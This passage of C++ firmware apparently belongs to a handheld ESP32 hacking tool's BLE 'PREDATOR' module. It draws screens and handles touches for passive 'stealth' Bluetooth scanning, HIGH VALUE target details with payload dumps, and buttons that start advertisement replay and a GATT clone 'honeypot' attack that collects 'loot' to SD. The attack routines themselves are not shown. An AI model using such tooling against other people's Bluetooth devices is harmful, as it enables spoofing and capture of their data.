        // Left zone → STOP
        if (tx < zoneW) {
            stopHoneypot();
            return;
        }
        // Center zone → SAVE
        if (tx >= zoneW && tx < zoneW * 2) {
            hpSetStatus("Saving to SD...", HALEHOUND_MAGENTA);
            hpSaveLootToSD();
            return;
        }
        // Right zone → CLEAR
        if (tx >= zoneW * 2) {
            S->hpLootCount = 0;
            S->hpLootScroll = 0;
            S->hpConnCount = 0;
            memset(S->hpLoot, 0, sizeof(S->hpLoot));
            hpSetStatus("Loot cleared", HALEHOUND_VIOLET);
            return;
        }
    }

    // Scroll loot: upper half = scroll up, lower half = scroll down
    int bannerBottom = SCALE_Y(92) + SCALE_H(18) + SCALE_H(14) + 2;
    int btnTop = SCREEN_HEIGHT - SCALE_H(34);
    if (ty >= bannerBottom && ty < btnTop) {
        int mid = (bannerBottom + btnTop) / 2;
        if (ty < mid) {
            if (S->hpLootScroll < S->hpLootCount) S->hpLootScroll++;
        } else {
            if (S->hpLootScroll > 0) S->hpLootScroll--;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING — ICON BAR
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);

    // Back (always)
    tft.drawBitmap(SCALE_X(10), ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);

    if (S->phase == PHASE_LISTEN) {
        // Pause/Resume
        tft.drawBitmap(SCALE_X(55), ICON_BAR_Y, bitmap_icon_start, 16, 16,
                       S->scanning ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
        // Filter left
        tft.drawBitmap(SCALE_X(100), ICON_BAR_Y, bitmap_icon_LEFT, 16, 16, HALEHOUND_MAGENTA);
        // Filter right
        tft.drawBitmap(SCALE_X(135), ICON_BAR_Y, bitmap_icon_RIGHT, 16, 16, HALEHOUND_MAGENTA);
        // Speed
        tft.drawBitmap(SCALE_X(175), ICON_BAR_Y, bitmap_icon_signal, 16, 16, HALEHOUND_VIOLET);
        // BLE indicator
        tft.drawBitmap(SCALE_X(215), ICON_BAR_Y, bitmap_icon_ble, 16, 16,
                       S->scanning ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
    } else if (S->phase == PHASE_TARGET) {
        // Only back icon — handled above
    } else if (S->phase == PHASE_ATTACK) {
        // Stop
        tft.drawBitmap(SCALE_X(55), ICON_BAR_Y, bitmap_icon_start, 16, 16, HALEHOUND_HOTPINK);
        // Speed cycle
        tft.drawBitmap(SCALE_X(100), ICON_BAR_Y, bitmap_icon_signal, 16, 16, HALEHOUND_VIOLET);
    } else if (S->phase == PHASE_RECON) {
        // Only back icon during RECON (abort)
    } else if (S->phase == PHASE_HONEYPOT) {
        // Stop icon
        tft.drawBitmap(SCALE_X(55), ICON_BAR_Y, bitmap_icon_start, 16, 16, HALEHOUND_HOTPINK);
    }

    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING — PHASE 1: LISTEN
// ═══════════════════════════════════════════════════════════════════════════

static void drawHeader() {
    tft.fillRect(0, SCALE_Y(38), SCREEN_WIDTH, SCALE_H(20), HALEHOUND_BLACK);
    drawGlitchText(SCALE_Y(55), "PREDATOR", &Nosifer_Regular10pt7b);

    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(5, SCALE_Y(42));
    int filtered = bpCountFiltered();
    tft.printf("%d/%d", filtered, S->deviceCount);
    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(195), SCALE_Y(42));
    tft.print(pfNames[S->filter]);
}

static void drawColumnHeaders() {
    tft.fillRect(0, SCALE_Y(58), SCREEN_WIDTH, SCALE_H(14), HALEHOUND_DARK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(SCALE_X(5), SCALE_Y(60));
    tft.print("RSSI");
    tft.setCursor(SCALE_X(28), SCALE_Y(60));
    tft.print("DEVICE");
    tft.setCursor(SCALE_X(145), SCALE_Y(60));
    tft.print("WHAT");
}

static void drawDeviceList() {
    drawHeader();
    drawColumnHeaders();

    int listY = SCALE_Y(74);
    int listH = SCALE_Y(280) - listY;
    tft.fillRect(0, listY, SCREEN_WIDTH, listH, HALEHOUND_BLACK);

    if (S->deviceCount == 0) {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setTextSize(1);
        tft.setCursor(SCALE_X(30), SCALE_Y(140));
        tft.print("Listening for devices...");
        return;
    }

    uint32_t now = millis();
    int y = listY;
    int drawn = 0;
    int skipped = 0;

    for (int i = 0; i < S->deviceCount && drawn < BP_MAX_VISIBLE; i++) {
        ReconDevice* d = &S->devices[i];
        if (!bpPassesFilter(d)) continue;

        if (skipped < S->listStartIndex) {
            skipped++;
            continue;
        }

        int filtPos = skipped + drawn;
        uint32_t age = now - d->lastSeen;

        // Row highlight
        bool isCurrent = (filtPos == S->currentIndex);
        if (isCurrent) {
            tft.fillRect(0, y, SCREEN_WIDTH, BP_ITEM_HEIGHT - 2, HALEHOUND_DARK);
        }

        // Color coding (tier-aware)
        uint16_t rowColor;
        if (isCurrent) {
            rowColor = HALEHOUND_BRIGHT;
        } else if (d->selected) {
            rowColor = HALEHOUND_HOTPINK;
        } else if (d->tier == TIER_RED) {
            rowColor = TFT_RED;
        } else if (age < 5000 && d->hasName) {
            rowColor = TFT_WHITE;
        } else if (age < 5000) {
            rowColor = HALEHOUND_MAGENTA;
        } else if (d->companyId != 0xFFFF && lookupCompanyName(d->companyId) != nullptr) {
            rowColor = HALEHOUND_VIOLET;
        } else if (age > 30000) {
            rowColor = HALEHOUND_GUNMETAL;
        } else {
            rowColor = HALEHOUND_MAGENTA;
        }

        uint16_t bgColor = isCurrent ? HALEHOUND_DARK : TFT_BLACK;
        tft.setTextColor(rowColor, bgColor);
        tft.setTextSize(1);

        // Selection marker
        if (d->selected) {
            tft.setCursor(SCALE_X(1), y + SCALE_H(4));
            tft.print(">");
        }

        // RSSI bar
        bpDrawRssiBar(SCALE_X(5), y + 1, d->rssi);

        // DEVICE column: name or short MAC
        tft.setCursor(SCALE_X(28), y + SCALE_H(4));
        if (d->hasName && d->name[0]) {
            char trunc[19];
            strncpy(trunc, d->name, 18);
            trunc[18] = '\0';
            tft.print(trunc);
        } else {
            char shortMac[10];
            snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
                     d->mac[3], d->mac[4], d->mac[5]);
            tft.print(shortMac);
        }

        // WHAT column: appearance > company > "Named" > "???"
        tft.setCursor(SCALE_X(145), y + SCALE_H(4));
        const char* what = bpDevWhat(d);
        char whatTrunc[14];
        strncpy(whatTrunc, what, 13);
        whatTrunc[13] = '\0';
        tft.print(whatTrunc);

        // RED tier marker
        if (d->tier == TIER_RED) {
            tft.setTextColor(TFT_RED, bgColor);
            tft.setCursor(SCALE_X(230), y + SCALE_H(4));
            tft.print("!");
            tft.setTextColor(rowColor, bgColor);
        }

        // Active dot
        if (d->frameCount > 5 && age < 10000) {
            tft.fillCircle(SCREEN_WIDTH - SCALE_X(5), y + SCALE_H(8), 2, HALEHOUND_HOTPINK);
        }

        y += BP_ITEM_HEIGHT;
        drawn++;
    }

    // Stats line — tier counts
    int statsY = SCALE_Y(280);
    tft.fillRect(0, statsY, SCREEN_WIDTH, SCALE_H(14), HALEHOUND_BLACK);
    tft.setTextSize(1);
    int redCnt = 0, yelCnt = 0;
    for (int i = 0; i < S->deviceCount; i++) {
        if (S->devices[i].tier == TIER_RED)    redCnt++;
        else if (S->devices[i].tier == TIER_YELLOW) yelCnt++;
    }
    tft.setTextColor(TFT_RED, HALEHOUND_BLACK);
    tft.setCursor(5, statsY + 1);
    tft.printf("RED:%d", redCnt);
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(55), statsY + 1);
    tft.printf("YEL:%d", yelCnt);
    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(110), statsY + 1);
    tft.printf("Total:%d", redCnt + yelCnt);
    tft.setCursor(SCALE_X(180), statsY + 1);
    uint32_t elapsed = (millis() - S->scanStartTime) / 1000;
    tft.printf("%02d:%02d", (int)(elapsed / 60), (int)(elapsed % 60));

    // Footer — page indicator + hint
    int footY = SCALE_Y(295);
    tft.fillRect(0, footY, SCREEN_WIDTH, SCALE_H(25), HALEHOUND_GUNMETAL);
    int filtered = bpCountFiltered();
    int totalPages = (filtered + BP_MAX_VISIBLE - 1) / BP_MAX_VISIBLE;
    if (totalPages < 1) totalPages = 1;
    int curPage = (S->listStartIndex / BP_MAX_VISIBLE) + 1;
    int textY = footY + SCALE_H(8);
    if (totalPages > 1) {
        // Left half = PREV button, right half = NEXT button (matches touch zones)
        // PREV: left side with < arrow
        tft.setTextColor(curPage > 1 ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, HALEHOUND_GUNMETAL);
        tft.setCursor(5, textY);
        tft.print("< PREV");

        // Page indicator centered
        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_GUNMETAL);
        char pgBuf[8];
        snprintf(pgBuf, sizeof(pgBuf), "%d/%d", curPage, totalPages);
        int pgW = strlen(pgBuf) * 6;  // approx char width
        tft.setCursor((SCREEN_WIDTH - pgW) / 2, textY);
        tft.print(pgBuf);

        // NEXT: right side with > arrow
        tft.setTextColor(curPage < totalPages ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, HALEHOUND_GUNMETAL);
        tft.setCursor(SCREEN_WIDTH - 42, textY);
        tft.print("NEXT >");
    } else {
        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_GUNMETAL);
        tft.setCursor(5, textY);
        tft.print("TAP=Target  LONG=Select");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING — PHASE 2: TARGET (detail overlay)
// ═══════════════════════════════════════════════════════════════════════════

static void drawTargetOverlay() {
    int realIdx = bpFilteredToReal(S->detailIdx);
    if (realIdx < 0 || realIdx >= S->deviceCount) return;

    ReconDevice* d = &S->devices[realIdx];

    // Overlay box
    int ovX = SCALE_X(5);
    int ovY = SCALE_Y(38);
    int ovW = SCREEN_WIDTH - SCALE_X(10);
    int ovH = SCREEN_HEIGHT - SCALE_H(45);
    tft.fillRect(ovX, ovY, ovW, ovH, HALEHOUND_BLACK);
    tft.drawRect(ovX, ovY, ovW, ovH, HALEHOUND_HOTPINK);
    tft.drawRect(ovX + 1, ovY + 1, ovW - 2, ovH - 2, HALEHOUND_VIOLET);

    int y = SCALE_Y(48);
    int lineH = SCALE_H(14);
    int textX = SCALE_X(12);
    tft.setTextSize(1);

    // Title
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(SCALE_X(75), y);
    tft.print(">> TARGET <<");
    y += lineH + 2;

    // Tier badge
    if (d->tier == TIER_RED) {
        tft.setTextColor(TFT_RED);
        tft.setCursor(SCALE_X(68), y);
        tft.print("[HIGH VALUE]");
        y += lineH;
    }

    // Name
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("Name: ");
    tft.setTextColor(TFT_WHITE);
    tft.print(d->hasName ? d->name : "(none)");
    y += lineH;

    // Full MAC
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("MAC:  ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    char macStr[18];
    bpMacToStr(d->mac, macStr, sizeof(macStr));
    tft.print(macStr);
    y += lineH;

    // Address type
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("Type: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print(bpAddrTypeStr(d->addrType));
    if (d->addrType == BLE_ADDR_TYPE_PUBLIC) {
        tft.setTextColor(0xFD20);  // Yellow warning
        tft.print(" MAC MOD");
    }
    y += lineH;

    // Vendor / Company
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("Vendor: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(bpDevLabel(d->companyId, d->hasName));
    y += lineH;

    // RSSI + proximity
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("RSSI: ");
    tft.setTextColor(TFT_WHITE);
    tft.printf("%d dBm", d->rssi);
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.printf(" (%d/%d)", d->rssiMin, d->rssiMax);
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.printf(" %s", bpProximityStr(d->rssi));
    y += lineH;

    // Frame count + age
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("Frames: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(d->frameCount);
    uint32_t age = (millis() - d->firstSeen) / 1000;
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.printf("  Age: %ds", age);
    y += lineH + 4;

    // Payload hex dump
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.printf("Payload (%d bytes):", d->payloadLen);
    y += lineH;

    // Show payload in rows of 10 bytes
    tft.setTextColor(HALEHOUND_VIOLET);
    for (int row = 0; row < 4 && row * 10 < d->payloadLen; row++) {
        tft.setCursor(textX, y);
        int start = row * 10;
        int end = start + 10;
        if (end > d->payloadLen) end = d->payloadLen;
        for (int j = start; j < end; j++) {
            tft.printf("%02X", d->payload[j]);
        }
        y += lineH - 2;
    }
    y += 4;

    // Manufacturer data
    if (d->mfgDataLen > 0) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(textX, y);
        tft.print("MfgData: ");
        tft.setTextColor(HALEHOUND_VIOLET);
        for (int i = 0; i < d->mfgDataLen; i++) {
            tft.printf("%02X ", d->mfgData[i]);
        }
        y += lineH;
    }

    // ── REPLAY / HONEYPOT / BACK buttons — pinned to bottom of overlay ──
    int btnW = SCALE_W(60);
    int btnH = SCALE_H(24);
    int btnY = SCREEN_HEIGHT - SCALE_H(40);
    int replayX  = SCALE_X(5);
    int hpotX    = SCALE_X(80);
    int backX    = SCALE_X(160);

    // Save for touch detection
    S->targetBtnY = btnY;

    bool canAttack = ::isOffensiveAllowed() && d->payloadLen > 0;
    uint16_t atkColor = canAttack ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;

    // REPLAY button — same behavior as old ATTACK
    tft.fillRect(replayX, btnY, btnW, btnH, HALEHOUND_DARK);
    tft.drawRect(replayX, btnY, btnW, btnH, atkColor);
    tft.setTextColor(atkColor);
    tft.setCursor(replayX + SCALE_X(6), btnY + SCALE_H(7));
    tft.print("REPLAY");

    // HONEYPOT button — GATT clone attack
    uint16_t hpColor = canAttack ? HALEHOUND_VIOLET : HALEHOUND_GUNMETAL;
    tft.fillRect(hpotX, btnY, btnW + SCALE_W(10), btnH, HALEHOUND_DARK);
    tft.drawRect(hpotX, btnY, btnW + SCALE_W(10), btnH, hpColor);
    tft.setTextColor(hpColor);
    tft.setCursor(hpotX + SCALE_X(4), btnY + SCALE_H(7));
    tft.print("HONEYPOT");

    // BACK button
    tft.fillRect(backX, btnY, btnW, btnH, HALEHOUND_DARK);
    tft.drawRect(backX, btnY, btnW, btnH, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(backX + SCALE_X(10), btnY + SCALE_H(7));
    tft.print("BACK");
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING — PHASE 3: ATTACK
// ═══════════════════════════════════════════════════════════════════════════

// PROGMEM skull icon table
static const unsigned char* const bpSkulls[BP_SKULL_NUM] PROGMEM = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

static void drawAttackView() {
    int y = SCALE_Y(42);
    tft.setTextSize(1);

    // Title
    tft.fillRect(0, SCALE_Y(38), SCREEN_WIDTH, SCALE_H(20), HALEHOUND_BLACK);
    drawGlitchText(SCALE_Y(55), "PREDATOR", &Nosifer_Regular10pt7b);

    // Status
    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(65), SCALE_Y(42));
    tft.print(">> ATTACKING <<");

    y = SCALE_Y(66);

    // Find first selected target for display
    int selIdx = -1;
    for (int i = 0; i < S->deviceCount; i++) {
        if (S->devices[i].selected) { selIdx = i; break; }
    }
    if (selIdx < 0) return;

    ReconDevice& t = S->devices[selIdx];

    // Target info
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(5, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
    char macStr[18];
    bpMacToStr(t.mac, macStr, sizeof(macStr));
    tft.print(macStr);
    y += 14;

    // Payload preview
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(5, y);
    tft.print("PLD: ");
    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
    int showBytes = t.payloadLen > 8 ? 8 : t.payloadLen;
    for (int i = 0; i < showBytes; i++) {
        tft.printf("%02X", t.payload[i]);
    }
    if (t.payloadLen > 8) tft.print("...");
    y += 14;

    // Type + mode
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(5, y);
    tft.print("TYP: ");
    tft.setTextColor(HALEHOUND_BRIGHT, HALEHOUND_BLACK);
    tft.print(bpDevLabel(t.companyId, t.hasName));
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.print("  MODE: ");
    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
    tft.print(S->replayMode == RM_SINGLE ? "SINGLE" : "ROTATE");
    y += 14;

    // Dwell
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(5, y);
    tft.printf("DWELL: %dms", S->replayDwellMs);

    S->staticDrawn = true;
}

static void drawDynamicAttack() {
    if (!S->staticDrawn) drawAttackView();
    if (!S->replaying) return;

    // TX counter
    char buf[36];
    snprintf(buf, sizeof(buf), "[+] TX: %-8lu (%d/s)  ", S->replayCount, S->replayRate);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(5, SCALE_Y(130));
    tft.print(buf);
}

static void drawSkulls() {
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / BP_SKULL_NUM;
    int frame = (int)(millis() / 120);

    for (int i = 0; i < BP_SKULL_NUM; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, BP_SKULL_Y, 16, 16, TFT_BLACK);

        uint16_t color;
        if (S->replaying) {
            int phase = (frame + i) % 8;
            if (phase < 4) {
                color = bpGradientColor(phase / 3.0f);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;
        }

        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&bpSkulls[i]);
        tft.drawBitmap(x, BP_SKULL_Y, icon, 16, 16, color);
    }

    int labelX = skullStartX + (BP_SKULL_NUM * skullSpacing) + 5;
    tft.fillRect(labelX - 5, BP_SKULL_Y, 50, 16, TFT_BLACK);
    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(labelX, BP_SKULL_Y + 4);
    tft.print(S->replaying ? "TX!" : "OFF");
}

static void drawCounterBar() {
    tft.fillRect(0, BP_BAR_Y, SCREEN_WIDTH, 25, TFT_BLACK);

    int barX = 10;
    int barY = BP_BAR_Y + 2;
    int barW = SCALE_W(140);
    int barH = 10;

    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    // Fill proportional to rate
    float maxRate = 1000.0f / S->replayDwellMs;
    float fillPct = (S->replayRate > 0) ? (float)S->replayRate / maxRate : 0.0f;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            uint16_t c = bpGradientColor(ratio);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%lu", S->replayCount);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(160), BP_BAR_Y + 3);
    tft.printf("%d rep/s", S->replayRate);

    if (S->replaying) {
        tft.drawBitmap(SCALE_X(220), BP_BAR_Y + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// TOUCH HANDLING
// ═══════════════════════════════════════════════════════════════════════════

static void handleListenTouch() {
    uint16_t tx, ty;
    bool touching = getTouchPoint(&tx, &ty);

    if (bpWaitForRelease) {
        if (!touching) bpWaitForRelease = false;
        return;
    }
    if (!touching) return;
    if (millis() - S->lastIconTap < 350) return;
    S->lastIconTap = millis();

    // ── Icon bar — equal zones for reliable touch on all screens ─────────
    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
        bpWaitForRelease = true;

        // 5 icon zones: Back | Scan | FilterL | FilterR | Speed
        // BLE indicator (rightmost) is display-only, no touch action
        int zw = SCREEN_WIDTH / 5;

        // Back (zone 0)
        if (tx < zw) {
            S->exitRequested = true;
            return;
        }
        // Scan toggle (zone 1)
        if (tx >= zw && tx < zw * 2) {
            if (S->scanning) {
                S->scanning = false;
                if (S->pScan) S->pScan->stop();
            } else {
                S->scanning = true;
                if (S->pScan) S->pScan->start(5, bpScanComplete, false);
            }
            drawIconBar();
            return;
        }
        // Filter left (zone 2)
        if (tx >= zw * 2 && tx < zw * 3) {
            S->filter = (PredFilter)((S->filter + PF_COUNT - 1) % PF_COUNT);
            S->listStartIndex = 0;
            S->currentIndex = 0;
            drawDeviceList();
            return;
        }
        // Filter right (zone 3)
        if (tx >= zw * 3 && tx < zw * 4) {
            S->filter = (PredFilter)((S->filter + 1) % PF_COUNT);
            S->listStartIndex = 0;
            S->currentIndex = 0;
            drawDeviceList();
            return;
        }
        // Speed (zone 4)
        if (tx >= zw * 4) {
            S->dwellIndex = (S->dwellIndex + 1) % BP_DWELL_COUNT;
            S->replayDwellMs = dwellPresets[S->dwellIndex];
            drawDeviceList();  // Refresh stats line showing dwell
            return;
        }
        return;
    }

    // ── Device list area ──────────────────────────────────────────────────
    int listTopY = SCALE_Y(74);
    int listBotY = SCALE_Y(280);
    if (ty >= listTopY && ty < listBotY && S->deviceCount > 0) {
        int tappedRow = (ty - listTopY) / BP_ITEM_HEIGHT;
        if (tappedRow >= BP_MAX_VISIBLE) tappedRow = BP_MAX_VISIBLE - 1;  // Clamp to visible rows
        int newIdx = S->listStartIndex + tappedRow;
        int filtered = bpCountFiltered();
        if (newIdx >= filtered) return;

        bpWaitForRelease = true;

        // Double-tap detection for multi-select (long press simulation)
        static unsigned long lastListTap = 0;
        static int lastTapIdx = -1;
        unsigned long now = millis();

        if (lastTapIdx == newIdx && now - lastListTap < 600) {
            // Double-tap on same item → toggle selection
            int realIdx = bpFilteredToReal(newIdx);
            if (realIdx >= 0) {
                S->devices[realIdx].selected = !S->devices[realIdx].selected;
                S->currentIndex = newIdx;
                drawDeviceList();
            }
            lastTapIdx = -1;
        } else {
            // Single tap → go to TARGET detail
            S->currentIndex = newIdx;
            S->detailIdx = newIdx;
            S->phase = PHASE_TARGET;
            tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, TFT_BLACK);
            drawIconBar();
            drawTargetOverlay();
        }

        lastListTap = now;
        lastTapIdx = newIdx;
        return;
    }

    // ── Footer area (scroll pages) — includes stats line for larger touch target
    if (ty >= listBotY) {
        bpWaitForRelease = true;
        int filtered = bpCountFiltered();
        if (tx < SCREEN_WIDTH / 2) {
            // Prev page
            if (S->listStartIndex >= BP_MAX_VISIBLE) {
                S->listStartIndex -= BP_MAX_VISIBLE;
                S->currentIndex = S->listStartIndex;
                drawDeviceList();
            }
        } else {
            // Next page
            if (S->listStartIndex + BP_MAX_VISIBLE < filtered) {
                S->listStartIndex += BP_MAX_VISIBLE;
                S->currentIndex = S->listStartIndex;
                drawDeviceList();
            }
        }
    }
}

static void goBackToListen() {
    S->phase = PHASE_LISTEN;
    S->listenDirty = true;
    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, TFT_BLACK);
    drawIconBar();
    drawDeviceList();
}

static void handleTargetTouch() {
    uint16_t tx, ty;
    bool touching = getTouchPoint(&tx, &ty);

    if (bpWaitForRelease) {
        if (!touching) bpWaitForRelease = false;
        return;
    }
    if (!touching) return;
    if (millis() - S->lastIconTap < 350) return;
    S->lastIconTap = millis();
    bpWaitForRelease = true;

    // Icon bar back → return to LISTEN (NOT exit module)
    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
        goBackToListen();
        return;
    }

    // REPLAY / HONEYPOT / BACK buttons — 3-zone split for robust touch on all screens
    int btnY = S->targetBtnY;
    int btnH = SCALE_H(30);  // Generous Y hit area
    int zoneW = SCREEN_WIDTH / 3;

    if (ty >= btnY - 5 && ty <= btnY + btnH) {
        // Left zone → REPLAY
        if (tx < zoneW) {
            if (!::isOffensiveAllowed()) return;

            int realIdx = bpFilteredToReal(S->detailIdx);
            if (realIdx < 0) return;
            ReconDevice* d = &S->devices[realIdx];
            if (d->payloadLen == 0) return;

            if (!d->selected) {
                d->selected = true;
            }

            startReplay();
            return;
        }

        // Center zone → HONEYPOT
        if (tx >= zoneW && tx < zoneW * 2) {
            if (!::isOffensiveAllowed()) return;

            int realIdx = bpFilteredToReal(S->detailIdx);
            if (realIdx < 0) return;
            ReconDevice* d = &S->devices[realIdx];
            if (d->payloadLen == 0) return;

            if (!d->selected) {
                d->selected = true;
            }

            startRecon();
            return;
        }

        // Right zone → BACK
        if (tx >= zoneW * 2) {
            goBackToListen();
            return;
        }
    }
}

static void handleAttackTouch() {
    uint16_t tx, ty;
    bool touching = getTouchPoint(&tx, &ty);

    if (bpWaitForRelease) {
        if (!touching) bpWaitForRelease = false;
        return;
    }
    if (!touching) return;
    if (millis() - S->lastIconTap < 350) return;
    S->lastIconTap = millis();
    bpWaitForRelease = true;

    // Icon bar — 3-zone: Back/Stop | Speed | (unused)
    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
        // Left half → stop replay (Back + Stop both do same thing)
        if (tx < SCREEN_WIDTH / 2) {
            stopReplay();
            return;
        }
        // Right half → speed cycle
        S->dwellIndex = (S->dwellIndex + 1) % BP_DWELL_COUNT;
        S->replayDwellMs = dwellPresets[S->dwellIndex];
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
        tft.setCursor(5, SCALE_Y(108));
        tft.printf("DWELL: %dms    ", S->replayDwellMs);
        return;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (S && S->initialized) return;

    #if CYD_DEBUG
    Serial.println("[PREDATOR] Initializing BLE Predator...");
    #endif

    // Heap-allocate state (zero-init)
    if (!S) {
        S = (PredatorState*)calloc(1, sizeof(PredatorState));
        if (!S) {
            Serial.println("[PREDATOR] ERROR: calloc failed");
            return;
        }
    } else {
        memset(S, 0, sizeof(PredatorState));
    }

    S->replayDwellMs = 100;
    S->dwellIndex = 0;
    S->filter = PF_ALL;
    S->phase = PHASE_LISTEN;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();

    // Tear down WiFi before BLE init
    WiFi.mode(WIFI_OFF);
    delay(50);

    // BLE init
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    S->pScan = BLEDevice::getScan();
    if (!S->pScan) {
        Serial.println("[PREDATOR] ERROR: getScan() returned NULL");
        S->exitRequested = true;
        return;
    }

    S->pScan->setActiveScan(false);   // PASSIVE — stealth mode
    S->pScan->setInterval(100);
    S->pScan->setWindow(99);          // Near-continuous listening
    S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);  // wantDuplicates = true

    S->scanning = true;
    S->initialized = true;
    S->scanStartTime = millis();
    S->lastDisplayUpdate = millis();

    drawDeviceList();

